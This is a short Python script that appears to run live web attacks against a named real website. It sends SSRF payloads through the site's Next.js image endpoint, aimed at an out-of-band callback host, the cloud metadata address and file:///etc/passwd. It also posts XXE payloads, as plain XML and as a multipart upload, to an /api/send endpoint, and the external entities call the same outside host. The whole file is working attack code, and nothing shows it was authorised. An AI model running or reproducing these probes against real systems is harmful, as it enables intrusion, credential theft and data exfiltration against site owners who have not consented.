import urllib.request, urllib.parse
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
S="ooba846e497ed1b.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
X="ooba64ecd5a1876.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
def raw(u,data=None,hdr=None):
    h={"User-Agent":UA,"Accept":"*/*","Accept-Encoding":"identity"}
    if hdr:h.update(hdr)
    req=urllib.request.Request(u,data=data,headers=h)
    try:
        r=urllib.request.urlopen(req,timeout=35); return r.status,dict(r.headers),r.read()
    except Exception as e:
        try: return e.code,dict(e.headers),e.read()
        except: return getattr(e,'code',0),{},b''

B="https://www.infinitycapital.bh"
tests=[
 ("img-oob", f"/_next/image?url={urllib.parse.quote('http://%s/ssrf'%S)}&w=640&q=75", None),
 ("img-oob-plainhost", f"/_next/image?url={urllib.parse.quote('http://%s'%S)}&w=640&q=75", None),
 ("img-meta", "/_next/image?url="+urllib.parse.quote("http://169.254.169.254/latest/meta-data/")+"&w=640&q=75", None),
 ("img-file", "/_next/image?url="+urllib.parse.quote("file:///etc/passwd")+"&w=640&q=75", None),
]
for n,p,d in tests:
    st,h,b=raw(B+p,d)
    ct=h.get("Content-Type","-")
    print(f"{n}: {st} ct={ct} len={len(b)} snippet={b[:200]!r}")

# XXE bodies on api/send
xxe=('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://%s/xxe">]>'
     '<r><to>&x;</to><message>&x;</message></r>'%X)
st,h,b=raw(B+"/api/send",xxe.encode(),{"Content-Type":"application/xml"})
print("xxe-xml:",st,b[:200])
xxe2=('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://%s/xxe2">]>'
     '<r><to>&x;</to></r>'%X)
st,h,b=raw(B+"/api/send",xxe2.encode(),{"Content-Type":"text/xml"})
print("xxe-textxml:",st,b[:200])
# multipart with XML file part
bnd="----ivbnd1"
mp=(f"--{bnd}\r\nContent-Disposition: form-data; name=\"fname\"\r\n\r\nT\r\n"
    f"--{bnd}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"a.xml\"\r\nContent-Type: application/xml\r\n\r\n"
    + xxe + f"\r\n--{bnd}--\r\n")
st,h,b=raw(B+"/api/send",mp.encode(),{"Content-Type":f"multipart/form-data; boundary={bnd}"})
print("xxe-multipart:",st,b[:200])